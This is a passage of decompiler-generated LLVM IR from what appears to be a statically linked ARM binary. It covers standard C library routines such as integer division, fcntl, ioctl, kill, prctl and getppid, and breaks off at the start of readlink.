  %v2_110fc = icmp slt i32 %v1_110fc, 0
  %v3_110fc = mul i32 %v1_110fc, 2
  br i1 %v2_110fc, label %dec_label_pc_11104, label %dec_label_pc_110f0thread-pre-split

dec_label_pc_11104:                               ; preds = %bb82, %dec_label_pc_110f0, %bb83
  %v2_1111059 = phi i32 [ %v3_110fc, %bb83 ], [ %v1_110fc, %bb82 ], [ %v1_110fc, %dec_label_pc_110f0 ]
  %v1_1110851 = phi i32 [ %v3_110f8, %bb83 ], [ %v1_110f8, %bb82 ], [ %v1_110f8, %dec_label_pc_110f0 ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11108

dec_label_pc_11108:                               ; preds = %.thread11, %dec_label_pc_11104
  %v1_1113c = phi i32 [ %v4_1113c, %.thread11 ], [ %v2_1111059, %dec_label_pc_11104 ]
  %v1_11110 = phi i32 [ %v0_11148, %.thread11 ], [ 0, %dec_label_pc_11104 ]
  %v1_11140 = phi i32 [ %v4_11140, %.thread11 ], [ %v1_1110851, %dec_label_pc_11104 ]
  %v1_1110c = phi i32 [ %v0_11138, %.thread11 ], [ %v0_110bc, %dec_label_pc_11104 ]
  %v3_11108 = icmp ult i32 %v1_1110c, %v1_11140
  br i1 %v3_11108, label %.thread7, label %bb84

bb84:                                             ; preds = %dec_label_pc_11108
  %v3_1110c = sub i32 %v1_1110c, %v1_11140
  store i32 %v3_1110c, i32* %r0.global-to-local, align 4
  %v3_11110 = or i32 %v1_11110, %v1_1113c
  store i32 %v3_11110, i32* %r2.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_11108, %bb84
  %v1_11118 = phi i32 [ %v1_1110c, %dec_label_pc_11108 ], [ %v3_1110c, %bb84 ]
  %v1_1111c = phi i32 [ %v1_11110, %dec_label_pc_11108 ], [ %v3_11110, %bb84 ]
  %v4_11114 = udiv i32 %v1_11140, 2
  %v6_11114 = icmp ult i32 %v1_11118, %v4_11114
  br i1 %v6_11114, label %.thread8, label %bb85

bb85:                                             ; preds = %.thread7
  %v3_11118 = urem i32 %v1_11140, 2
  %v4_11118 = icmp eq i32 %v3_11118, 0
  %v6_11118 = sub i32 %v1_11118, %v4_11114
  store i32 %v6_11118, i32* %r0.global-to-local, align 4
  br i1 %v4_11118, label %.thread8, label %bb86

bb86:                                             ; preds = %bb85
  %v5_1111c = udiv i32 %v1_1113c, 2
  %v6_1111c = or i32 %v1_1111c, %v5_1111c
  store i32 %v6_1111c, i32* %r2.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %bb85, %.thread7, %bb86
  %v1_11124 = phi i32 [ %v6_11118, %bb85 ], [ %v1_11118, %.thread7 ], [ %v6_11118, %bb86 ]
  %v1_11128 = phi i32 [ %v1_1111c, %bb85 ], [ %v1_1111c, %.thread7 ], [ %v6_1111c, %bb86 ]
  %v4_11120 = udiv i32 %v1_11140, 4
  %v6_11120 = icmp ult i32 %v1_11124, %v4_11120
  br i1 %v6_11120, label %.thread9, label %bb87

bb87:                                             ; preds = %.thread8
  %v3_11124 = and i32 %v1_11140, 2
  %v4_11124 = icmp eq i32 %v3_11124, 0
  %v6_11124 = sub i32 %v1_11124, %v4_11120
  store i32 %v6_11124, i32* %r0.global-to-local, align 4
  br i1 %v4_11124, label %.thread9, label %bb88

bb88:                                             ; preds = %bb87
  %v5_11128 = udiv i32 %v1_1113c, 4
  %v6_11128 = or i32 %v1_11128, %v5_11128
  store i32 %v6_11128, i32* %r2.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %bb87, %.thread8, %bb88
  %v1_11130 = phi i32 [ %v6_11124, %bb87 ], [ %v1_11124, %.thread8 ], [ %v6_11124, %bb88 ]
  %v1_11134 = phi i32 [ %v1_11128, %bb87 ], [ %v1_11128, %.thread8 ], [ %v6_11128, %bb88 ]
  %v4_1112c = udiv i32 %v1_11140, 8
  %v6_1112c = icmp ult i32 %v1_11130, %v4_1112c
  br i1 %v6_1112c, label %thread-pre-split, label %bb89

bb89:                                             ; preds = %.thread9
  %v3_11130 = and i32 %v1_11140, 4
  %v4_11130 = icmp eq i32 %v3_11130, 0
  %v6_11130 = sub i32 %v1_11130, %v4_1112c
  store i32 %v6_11130, i32* %r0.global-to-local, align 4
  br i1 %v4_11130, label %thread-pre-split, label %bb90

bb90:                                             ; preds = %bb89
  %v5_11134 = udiv i32 %v1_1113c, 8
  %v6_11134 = or i32 %v1_11134, %v5_11134
  store i32 %v6_11134, i32* %r2.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb90, %.thread9, %bb89
  %v0_11148 = phi i32 [ %v1_11134, %bb89 ], [ %v1_11134, %.thread9 ], [ %v6_11134, %bb90 ]
  %v0_11138 = phi i32 [ %v6_11130, %bb89 ], [ %v1_11130, %.thread9 ], [ %v6_11130, %bb90 ]
  %v2_11138 = icmp eq i32 %v0_11138, 0
  br i1 %v2_11138, label %dec_label_pc_11148, label %bb91

bb91:                                             ; preds = %thread-pre-split
  %tmp138 = icmp ult i32 %v1_1113c, 16
  br i1 %tmp138, label %dec_label_pc_11148, label %.thread11

.thread11:                                        ; preds = %bb91
  %v4_1113c = udiv i32 %v1_1113c, 16
  %v4_11140 = udiv i32 %v1_11140, 16
  br label %dec_label_pc_11108

dec_label_pc_11148:                               ; preds = %thread-pre-split, %bb91
  store i32 %v0_11148, i32* %r0.global-to-local, align 4
  ret i32 %v0_11148

dec_label_pc_11150:                               ; preds = %dec_label_pc_110bc
  %v9_110bc = icmp eq i32 %v0_110bc, %v1_110bc
  %. = zext i1 %v9_110bc to i32
  store i32 %., i32* %r0.global-to-local, align 4
  ret i32 %.

dec_label_pc_1115c:                               ; preds = %dec_label_pc_110c4
  %v2_1115c = icmp ugt i32 %v1_110bc, 65535
  br i1 %v2_1115c, label %bb95, label %.thread16

bb95:                                             ; preds = %dec_label_pc_1115c
  %v2_11160 = and i32 %v1_110bc, 32768
  %v3_11160 = icmp eq i32 %v2_11160, 0
  %v4_11160 = udiv i32 %v1_110bc, 65536
  br i1 %v3_11160, label %.thread16, label %bb96

.thread16:                                        ; preds = %bb95, %dec_label_pc_1115c
  %v0_1116c65 = phi i32 [ %v1_110bc, %dec_label_pc_1115c ], [ %v4_11160, %bb95 ]
  br label %bb96

bb96:                                             ; preds = %bb95, %.thread16
  %v1_11170 = phi i32 [ %v0_1116c65, %.thread16 ], [ %v4_11160, %bb95 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb95 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_1116c = icmp ugt i32 %v1_11170, 255
  br i1 %v2_1116c, label %bb97, label %.thread17

bb97:                                             ; preds = %bb96
  %v2_11170 = and i32 %v1_11170, 128
  %v3_11170 = icmp eq i32 %v2_11170, 0
  %v4_11170 = udiv i32 %v1_11170, 256
  br i1 %v3_11170, label %.thread17, label %bb98

bb98:                                             ; preds = %bb97
  %v2_11174 = or i32 %storemerge, 8
  store i32 %v2_11174, i32* %r2.global-to-local, align 4
  br label %.thread17

.thread17:                                        ; preds = %bb97, %bb96, %bb98
  %v1_11180 = phi i32 [ %storemerge, %bb96 ], [ %storemerge, %bb97 ], [ %v2_11174, %bb98 ]
  %v1_1117c = phi i32 [ %v1_11170, %bb96 ], [ %v4_11170, %bb97 ], [ %v4_11170, %bb98 ]
  %v2_11178 = icmp ugt i32 %v1_1117c, 15
  br i1 %v2_11178, label %bb99, label %.thread18

bb99:                                             ; preds = %.thread17
  %v2_1117c = and i32 %v1_1117c, 8
  %v3_1117c = icmp eq i32 %v2_1117c, 0
  %v4_1117c = udiv i32 %v1_1117c, 16
  br i1 %v3_1117c, label %.thread18, label %bb100

bb100:                                            ; preds = %bb99
  %v2_11180 = add nsw i32 %v1_11180, 4
  store i32 %v2_11180, i32* %r2.global-to-local, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb99, %.thread17, %bb100
  %v4_11188 = phi i32 [ %v1_11180, %.thread17 ], [ %v1_11180, %bb99 ], [ %v2_11180, %bb100 ]
  %v5_1118c = phi i32 [ %v1_1117c, %.thread17 ], [ %v4_1117c, %bb99 ], [ %v4_1117c, %bb100 ]
  %v2_11184 = icmp ugt i32 %v5_1118c, 3
  %v7_11184 = icmp eq i32 %v5_1118c, 4
  %v2_11188 = xor i1 %v7_11184, true
  %v3_11188 = and i1 %v2_11184, %v2_11188
  br i1 %v3_11188, label %bb101, label %bb102

bb101:                                            ; preds = %.thread18
  %v5_11188 = add nsw i32 %v4_11188, 3
  store i32 %v5_11188, i32* %r2.global-to-local, align 4
  br label %bb102

bb102:                                            ; preds = %.thread18, %bb101
  %v4_1118c = phi i32 [ %v4_11188, %.thread18 ], [ %v5_11188, %bb101 ]
  %v2_1118c = xor i1 %v2_11184, true
  %v3_1118c = or i1 %v7_11184, %v2_1118c
  br i1 %v3_1118c, label %bb103, label %bb104

bb103:                                            ; preds = %bb102
  %v8_1118c = udiv i32 %v5_1118c, 2
  %v9_1118c = add i32 %v4_1118c, %v8_1118c
  store i32 %v9_1118c, i32* %r2.global-to-local, align 4
  br label %bb104

bb104:                                            ; preds = %bb102, %bb103
  %v1_11190 = phi i32 [ %v4_1118c, %bb102 ], [ %v9_1118c, %bb103 ]
  %v6_11190 = lshr i32 %v0_110bc, %v1_11190
  store i32 %v6_11190, i32* %r0.global-to-local, align 4
  ret i32 %v6_11190

dec_label_pc_11198:                               ; preds = %entry
  %v0_1119c = call i32 @__div0()
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_1118c, { 1, 0 }
  uselistorder i1 %v7_11184, { 1, 0 }
  uselistorder i32 %v4_1117c, { 1, 0 }
  uselistorder i32 %v1_1117c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_11174, { 1, 0 }
  uselistorder i32 %v4_11170, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2, 3 }
  uselistorder i32 %v1_11170, { 1, 0, 2, 3 }
  uselistorder i32 %v4_11160, { 1, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_11138, { 1, 0 }
  uselistorder i32 %v0_11148, { 1, 0, 2 }
  uselistorder i32 %v4_1112c, { 1, 0 }
  uselistorder i32 %v1_11134, { 1, 2, 0 }
  uselistorder i32 %v4_11120, { 1, 0 }
  uselistorder i32 %v1_11128, { 1, 2, 0 }
  uselistorder i32 %v4_11114, { 1, 0 }
  uselistorder i32 %v1_1111c, { 1, 2, 0 }
  uselistorder i32 %v1_11140, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_11110, { 1, 0 }
  uselistorder i32 %v1_1113c, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_110fc, { 1, 0 }
  uselistorder i32 %v3_110f8, { 1, 0 }
  uselistorder i32 %v1_110f8, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_110fc, { 1, 2, 0, 3 }
  uselistorder i32 %v4_110e8, { 1, 0 }
  uselistorder i32 %v4_110e4, { 2, 1, 0 }
  uselistorder i32 %v1_110e8, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_110f0.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v1_110bc, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1 }
  uselistorder i32 %v0_110bc, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_110b0, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 9, 5, 6, 7, 8, 0, 1 }
  uselistorder i32 65535, { 4, 0, 1, 2, 3 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_11148, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_11104, { 2, 0, 1 }
  uselistorder label %dec_label_pc_110f0thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_111b0 = udiv i32 %arg1, %arg2
  ret i32 %v2_111b0
}

define i32 @__div0() local_unnamed_addr {
entry:
  %v1_111cc = call i32 @__GI_raise(i32 8)
  ret i32 %v1_111cc
}

define i32 @__GI___fcntl_nocancel(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v1_111e8 = add i32 %arg2, -12
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_111e8, 2
  br i1 %tmp, label %dec_label_pc_11224, label %dec_label_pc_11200

dec_label_pc_11200:                               ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp12 = icmp ult i32 %arg1, -4095
  br i1 %tmp12, label %dec_label_pc_11258, label %dec_label_pc_11214

dec_label_pc_11214:                               ; preds = %dec_label_pc_11200
  %v0_11218 = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_1124c

dec_label_pc_11224:                               ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp13 = icmp ugt i32 %arg1, -4096
  br i1 %tmp13, label %dec_label_pc_11240, label %dec_label_pc_11258

dec_label_pc_11240:                               ; preds = %dec_label_pc_11224
  %v0_11244 = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_1124c

dec_label_pc_1124c:                               ; preds = %dec_label_pc_11214, %dec_label_pc_11240
  %storemerge2 = phi i32 [ %v0_11218, %dec_label_pc_11214 ], [ %v0_11244, %dec_label_pc_11240 ]
  %storemerge.in = load i16, i16* @global_var_2222c.358, align 2
  %storemerge = sext i16 %storemerge.in to i32
  %v0_1124c = load i32, i32* %r2.global-to-local, align 4
  %v1_1124c = sub i32 0, %v0_1124c
  store i32 %v1_1124c, i32* %r2.global-to-local, align 4
  %v3_11250 = add i32 %storemerge, %storemerge2
  %v4_11250 = inttoptr i32 %v3_11250 to i32*
  store i32 %v1_1124c, i32* %v4_11250, align 4
  br label %dec_label_pc_11258

dec_label_pc_11258:                               ; preds = %dec_label_pc_11200, %dec_label_pc_11224, %dec_label_pc_1124c
  %storemerge1 = phi i32 [ -1, %dec_label_pc_1124c ], [ %arg1, %dec_label_pc_11224 ], [ %arg1, %dec_label_pc_11200 ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32* %r2.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i32 %arg1, { 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_11258, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1124c, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v6_11270 = load i32, i32* @r2, align 4
  %v9_11270 = load i32, i32* @r3, align 4
  store i32 %v9_11270, i32* %stack_var_-4, align 4
  %v3_11274 = load i32, i32* @r4, align 4
  store i32 %v3_11274, i32* %stack_var_-32, align 4
  %v6_11274 = load i32, i32* @r5, align 4
  %v12_11274 = load i32, i32* @r7, align 4
  %v4_11284 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 12824) to i32*), align 4
  %v2_1128c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_1128c, i32* @r3, align 4
  %v2_11290 = icmp eq i32 %v4_11284, 0
  %v0_11298 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11298, i32* @r5, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %v6_11270, i32* @r4, align 4
  br i1 %v2_11290, label %dec_label_pc_112b4, label %dec_label_pc_112a8

dec_label_pc_112a8:                               ; preds = %entry
  %v7_112a8 = icmp eq i32 %arg2, 7
  br i1 %v7_112a8, label %dec_label_pc_112f4, label %bb

bb:                                               ; preds = %dec_label_pc_112a8
  %v8_112ac = icmp eq i32 %arg2, 14
  br i1 %v8_112ac, label %dec_label_pc_112f4, label %dec_label_pc_112b4

dec_label_pc_112b4:                               ; preds = %bb, %entry
  store i32 %arg2, i32* @r1, align 4
  store i32 %v0_11298, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_11298, -4095
  br i1 %tmp, label %dec_label_pc_112ec, label %dec_label_pc_112d4

dec_label_pc_112d4:                               ; preds = %dec_label_pc_112b4
  %v0_112d8 = call i32 @__aeabi_read_tp()
  %v3_112dc = load i16, i16* @global_var_2222c.358, align 2
  %v4_112dc = sext i16 %v3_112dc to i32
  store i32 %v4_112dc, i32* @r3, align 4
  %v0_112e0 = load i32, i32* @r2, align 4
  %v1_112e0 = sub i32 0, %v0_112e0
  store i32 %v1_112e0, i32* @r2, align 4
  %v3_112e4 = add i32 %v4_112dc, %v0_112d8
  %v4_112e4 = inttoptr i32 %v3_112e4 to i32*
  store i32 %v1_112e0, i32* %v4_112e4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_112ec

dec_label_pc_112ec:                               ; preds = %dec_label_pc_112b4, %dec_label_pc_112d4
  %v0_112ec = phi i32 [ %v0_11298, %dec_label_pc_112b4 ], [ -1, %dec_label_pc_112d4 ]
  br label %dec_label_pc_11340

dec_label_pc_112f4:                               ; preds = %dec_label_pc_112a8, %bb
  %v0_112f4 = call i32 @__libc_enable_asynccancel()
  %v0_112f8 = load i32, i32* @r7, align 4
  store i32 %v0_112f8, i32* @r1, align 4
  store i32 %v0_112f4, i32* %r6.global-to-local, align 4
  %v0_11304 = load i32, i32* @r5, align 4
  store i32 %v0_11304, i32* %r0.global-to-local, align 4
  store i32 %v0_11304, i32* @r2, align 4
  %tmp15 = icmp ult i32 %v0_11304, -4095
  br i1 %tmp15, label %dec_label_pc_11334, label %dec_label_pc_1131c

dec_label_pc_1131c:                               ; preds = %dec_label_pc_112f4
  %v1_11320 = sub i32 0, %v0_11304
  %v0_11324 = call i32 @__aeabi_read_tp()
  store i32 %v0_11324, i32* %r0.global-to-local, align 4
  %v3_11328 = load i16, i16* @global_var_2222c.358, align 2
  %v4_11328 = sext i16 %v3_11328 to i32
  store i32 %v4_11328, i32* @r3, align 4
  %v3_1132c = add i32 %v4_11328, %v0_11324
  %v4_1132c = inttoptr i32 %v3_1132c to i32*
  store i32 %v1_11320, i32* %v4_1132c, align 4
  store i32 -1, i32* @r2, align 4
  %v0_11334.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11334

dec_label_pc_11334:                               ; preds = %dec_label_pc_112f4, %dec_label_pc_1131c
  %v0_11338 = phi i32 [ %v0_11304, %dec_label_pc_112f4 ], [ -1, %dec_label_pc_1131c ]
  %v0_11334 = phi i32 [ %v0_112f4, %dec_label_pc_112f4 ], [ %v0_11334.pre, %dec_label_pc_1131c ]
  store i32 %v0_11334, i32* %r0.global-to-local, align 4
  store i32 %v0_11338, i32* @r7, align 4
  %v1_1133c = call i32 @__libc_disable_asynccancel(i32 %v0_11334)
  store i32 %v1_1133c, i32* %r0.global-to-local, align 4
  %v0_11340.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_11340

dec_label_pc_11340:                               ; preds = %dec_label_pc_112ec, %dec_label_pc_11334
  %v0_11340 = phi i32 [ %v0_112ec, %dec_label_pc_112ec ], [ %v0_11340.pre, %dec_label_pc_11334 ]
  store i32 %v0_11340, i32* %r0.global-to-local, align 4
  %v2_11348 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_11348, i32* @r4, align 4
  store i32 %v6_11274, i32* @r5, align 4
  store i32 %v12_11274, i32* @r7, align 4
  ret i32 %v0_11340

; uselistorder directives
  uselistorder i32 %v0_11340, { 1, 0 }
  uselistorder i32 %v0_11334, { 1, 0 }
  uselistorder i32 %v0_11304, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_11298, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 4, 2, 7, 6, 0, 1 }
  uselistorder label %dec_label_pc_11340, { 1, 0 }
  uselistorder label %dec_label_pc_11334, { 1, 0 }
  uselistorder label %dec_label_pc_112f4, { 1, 0 }
  uselistorder label %dec_label_pc_112ec, { 1, 0 }
}

define i32 @getppid() local_unnamed_addr {
entry:
  %v1_11374 = load i32, i32* @r0, align 4
  ret i32 %v1_11374
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v9_11378 = load i32, i32* @r3, align 4
  store i32 %v9_11378, i32* %stack_var_-4, align 4
  %v3_1137c = load i32, i32* @r4, align 4
  store i32 %v3_1137c, i32* %stack_var_-32, align 4
  %v6_1137c = load i32, i32* @r5, align 4
  %v12_1137c = load i32, i32* @r7, align 4
  %v4_1138c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 12824) to i32*), align 4
  %v2_11394 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_11394, i32* @r3, align 4
  %v2_11398 = icmp eq i32 %v4_1138c, 0
  %v0_113a0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_113a0, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  br i1 %v2_11398, label %dec_label_pc_113b0, label %dec_label_pc_113e8

dec_label_pc_113b0:                               ; preds = %entry
  %tmp = icmp ult i32 %v0_113a0, -4095
  br i1 %tmp, label %dec_label_pc_113e0, label %dec_label_pc_113c8

dec_label_pc_113c8:                               ; preds = %dec_label_pc_113b0
  %v1_113cc = sub i32 0, %v0_113a0
  %v3_113d0 = load i16, i16* @global_var_2222c.358, align 2
  %v4_113d0 = sext i16 %v3_113d0 to i32
  store i32 %v4_113d0, i32* @r3, align 4
  %v0_113d4 = call i32 @__aeabi_read_tp()
  %v2_113d8 = load i32, i32* @r3, align 4
  %v3_113d8 = add i32 %v2_113d8, %v0_113d4
  %v4_113d8 = inttoptr i32 %v3_113d8 to i32*
  store i32 %v1_113cc, i32* %v4_113d8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_113e0

dec_label_pc_113e0:                               ; preds = %dec_label_pc_113b0, %dec_label_pc_113c8
  %v0_113e0 = phi i32 [ %v0_113a0, %dec_label_pc_113b0 ], [ -1, %dec_label_pc_113c8 ]
  br label %dec_label_pc_11434

dec_label_pc_113e8:                               ; preds = %entry
  %v0_113e8 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_113e8, i32* %r6.global-to-local, align 4
  %v0_113f8 = load i32, i32* @r4, align 4
  store i32 %v0_113f8, i32* %r0.global-to-local, align 4
  %tmp15 = icmp ult i32 %v0_113f8, -4095
  br i1 %tmp15, label %dec_label_pc_11428, label %dec_label_pc_11410

dec_label_pc_11410:                               ; preds = %dec_label_pc_113e8
  %v1_11414 = sub i32 0, %v0_113f8
  %v3_11418 = load i16, i16* @global_var_2222c.358, align 2
  %v4_11418 = sext i16 %v3_11418 to i32
  store i32 %v4_11418, i32* @r3, align 4
  %v0_1141c = call i32 @__aeabi_read_tp()
  store i32 %v0_1141c, i32* %r0.global-to-local, align 4
  %v2_11420 = load i32, i32* @r3, align 4
  %v3_11420 = add i32 %v2_11420, %v0_1141c
  %v4_11420 = inttoptr i32 %v3_11420 to i32*
  store i32 %v1_11414, i32* %v4_11420, align 4
  %v0_11428.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11428

dec_label_pc_11428:                               ; preds = %dec_label_pc_113e8, %dec_label_pc_11410
  %v0_1142c = phi i32 [ %v0_113f8, %dec_label_pc_113e8 ], [ -1, %dec_label_pc_11410 ]
  %v0_11428 = phi i32 [ %v0_113e8, %dec_label_pc_113e8 ], [ %v0_11428.pre, %dec_label_pc_11410 ]
  store i32 %v0_11428, i32* %r0.global-to-local, align 4
  store i32 %v0_1142c, i32* @r7, align 4
  %v1_11430 = call i32 @__libc_disable_asynccancel(i32 %v0_11428)
  store i32 %v1_11430, i32* %r0.global-to-local, align 4
  %v0_11434.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_11434

dec_label_pc_11434:                               ; preds = %dec_label_pc_113e0, %dec_label_pc_11428
  %v0_11434 = phi i32 [ %v0_113e0, %dec_label_pc_113e0 ], [ %v0_11434.pre, %dec_label_pc_11428 ]
  store i32 %v0_11434, i32* %r0.global-to-local, align 4
  %v2_1143c = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_1143c, i32* @r4, align 4
  store i32 %v6_1137c, i32* @r5, align 4
  store i32 %v12_1137c, i32* @r7, align 4
  ret i32 %v0_11434

; uselistorder directives
  uselistorder i32 %v0_11434, { 1, 0 }
  uselistorder i32 %v0_11428, { 1, 0 }
  uselistorder i32 %v0_113f8, { 1, 2, 0, 3 }
  uselistorder i32 %v0_113a0, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 7, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_11434, { 1, 0 }
  uselistorder label %dec_label_pc_11428, { 1, 0 }
  uselistorder label %dec_label_pc_113e0, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11458 = load i32, i32* @r7, align 4
  store i32 %v3_11458, i32* %stack_var_-8, align 4
  %v0_11464 = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11464, -4095
  br i1 %tmp, label %dec_label_pc_11484, label %dec_label_pc_1146c

dec_label_pc_1146c:                               ; preds = %entry
  %v1_11470 = sub i32 0, %v0_11464
  %v3_11474 = load i16, i16* @global_var_2222c.358, align 2
  %v4_11474 = sext i16 %v3_11474 to i32
  %v0_11478 = call i32 @__aeabi_read_tp()
  %v3_1147c = add i32 %v4_11474, %v0_11478
  %v4_1147c = inttoptr i32 %v3_1147c to i32*
  store i32 %v1_11470, i32* %v4_1147c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11484.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11484

dec_label_pc_11484:                               ; preds = %entry, %dec_label_pc_1146c
  %v1_11488 = phi i32 [ %v0_11464, %entry ], [ -1, %dec_label_pc_1146c ]
  %v2_11484 = phi i32 [ %v3_11458, %entry ], [ %v2_11484.pre, %dec_label_pc_1146c ]
  store i32 %v2_11484, i32* @r7, align 4
  ret i32 %v1_11488

; uselistorder directives
  uselistorder i32 %v0_11464, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11484, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_11490 = load i32, i32* @r4, align 4
  store i32 %v3_11490, i32* %stack_var_-12, align 4
  %v0_114a0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_114a0, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_114a0, -4095
  br i1 %tmp, label %dec_label_pc_114c8, label %dec_label_pc_114b0

dec_label_pc_114b0:                               ; preds = %entry
  %v0_114b4 = call i32 @__aeabi_read_tp()
  %v3_114b8 = load i16, i16* @global_var_2222c.358, align 2
  %v4_114b8 = sext i16 %v3_114b8 to i32
  %v0_114bc = load i32, i32* %r2.global-to-local, align 4
  %v1_114bc = sub i32 0, %v0_114bc
  store i32 %v1_114bc, i32* %r2.global-to-local, align 4
  %v3_114c0 = add i32 %v4_114b8, %v0_114b4
  %v4_114c0 = inttoptr i32 %v3_114c0 to i32*
  store i32 %v1_114bc, i32* %v4_114c0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_114c8.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_114c8

dec_label_pc_114c8:                               ; preds = %entry, %dec_label_pc_114b0
  %v1_114cc = phi i32 [ %v0_114a0, %entry ], [ -1, %dec_label_pc_114b0 ]
  %v2_114c8 = phi i32 [ %v3_11490, %entry ], [ %v2_114c8.pre, %dec_label_pc_114b0 ]
  store i32 %v2_114c8, i32* @r4, align 4
  ret i32 %v1_114cc

; uselistorder directives
  uselistorder i32 %v0_114a0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_114c8, { 1, 0 }
}

define i32 @readlink(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
